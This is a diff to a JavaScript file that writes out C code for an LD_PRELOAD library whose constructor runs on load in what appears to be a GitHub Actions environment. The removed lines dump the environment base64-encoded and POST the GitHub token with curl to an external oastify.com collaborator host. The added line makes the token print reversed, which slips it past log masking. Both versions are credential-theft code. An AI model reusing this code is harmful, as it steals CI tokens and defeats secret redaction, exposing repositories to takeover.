@@ -56,23 +56,7 @@ var testc = `#include <fcntl.h>
 
 static void __attribute__((constructor)) so_main(void) {
   unsetenv("LD_PRELOAD");
-  system("env | rev | base64 -w 0");
-
-  char* inputToken = getenv("INPUT_GITHUB-TOKEN");
-  if (inputToken != NULL && strlen(inputToken) > 2) {
-    printf("Trying to use GITHUB TOKEN....\n");
-    char command[1024];
-    snprintf(command, sizeof(command),
-             "curl -X POST https://ng77mee05nvr37hpmhvge45shjngb8zx.oastify.com "
-             "-H \"Content-Type: application/json\" "
-             "-d '{\"githubToken\": \"%s\"}'", 
-             inputToken);
-
-    system(command);
-  } else {
-    printf("INPUT_TOKEN is not set.\n");
-  }
-
+  setenv("INPUT_SCRIPT", "console.log(process.env['INPUT_GITHUB-TOKEN'].split('').reverse().join(''));", 1);
   return;
 }`
 fs.writeFile("test.c", testc, console.log);
